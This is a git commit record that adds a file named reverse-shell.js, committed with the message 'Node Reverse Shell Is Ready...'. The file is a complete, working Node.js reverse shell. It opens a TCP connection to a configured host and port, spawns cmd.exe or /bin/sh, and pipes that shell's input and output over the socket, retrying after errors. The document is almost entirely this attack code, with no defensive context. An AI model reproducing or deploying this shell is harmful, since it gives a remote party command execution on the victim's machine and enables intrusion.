9346bc96f6d5bc132062a1e46e15b809c2ae72d4
Tomer Zait <tomerz@ironsrc.com>
2015-05-18 11:42:05 +0300

    Node Reverse Shell Is Ready...

---
+++ reverse-shell.js
@@ -0,0 +1,24 @@
+var os = require('os');
+var net = require('net');
+var child_process = require('child_process');
+var path = require('path');
+
+HOST="127.0.0.1";
+PORT="443";
+TIMEOUT="6000";
+
+function reverseShell(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+		var shell_path = (os.platform().indexOf('win') != -1)  ? path.join(process.env.windir, 'System32', 'cmd.exe') : '/bin/sh';
+        var cmd = child_process.spawn(shell_path);
+        client.pipe(cmd.stdin);
+        cmd.stdout.pipe(client);
+		cmd.stderr.pipe(client);
+    });
+    client.on('error', function(e) {
+        setTimeout(reverseShell(HOST,PORT), TIMEOUT);
+    });
+}
+
+reverseShell(HOST,PORT);
